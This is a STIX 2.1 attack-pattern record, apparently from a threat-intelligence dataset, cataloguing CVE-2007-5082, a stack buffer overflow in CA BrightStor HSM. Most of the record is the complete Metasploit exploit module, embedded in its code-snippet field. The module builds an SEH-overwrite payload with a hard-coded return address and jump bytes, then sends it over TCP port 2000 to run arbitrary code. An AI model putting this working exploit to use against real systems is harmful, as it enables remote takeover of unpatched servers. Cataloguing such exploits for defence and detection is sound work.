{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24978436-27fd-4c4a-882b-eb1f561d2e2e",
    "created": "2024-08-14T16:48:13.558467Z",
    "modified": "2024-08-14T16:48:13.558471Z",
    "name": "CA BrightStor HSM Buffer Overflow",
    "description": " This module exploits one of the multiple stack buffer overflows in Computer Associates BrightStor HSM. By sending a specially crafted request, an attacker could overflow the buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/hsmserver.rb",
            "external_id": "hsmserver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5082"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor HSM Buffer Overflow',\n      'Description'    => %q{\n          This module exploits one of the multiple stack buffer overflows in Computer Associates BrightStor HSM.\n        By sending a specially crafted request, an attacker could overflow the buffer and execute arbitrary code.\n      },\n      'Author'         => [ 'toto' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-5082' ],\n          [ 'OSVDB', '41363' ],\n          [ 'BID', '25823' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1026,\n          'BadChars' => \"\\x00\\x0a\\x0d;\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          # NX can be bypassed by brute forcing ntdll addresses as the process is restarted\n          # pop/pop/ret in fpparser.dll (old from 2004)\n          [ 'BrightStor HSM 11.5 Windows All',\t{ 'Ret' => 0x12014c78 } ],\n        ],\n      'DisclosureDate' => '2007-09-27',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(2000)\n      ])\n  end\n\n  def exploit\n    connect\n\n    data =\n      [42,7,0,0].pack('VVVV') +\n      payload.encoded +\n      \"\\xeb\\x06\" +\n      Rex::Text.rand_text_alphanumeric(2) +\n      [ target.ret ].pack('V') +\n      \"\\xe9\\xf1\\xfb\\xff\\xff\" +\n      Rex::Text.rand_text_alphanumeric(0x100)\n\n    sploit = [data.length + 4].pack('V') + data\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sock.put(sploit)\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-09-27",
    "x_mitre_platforms": [
        "win'"
    ]
}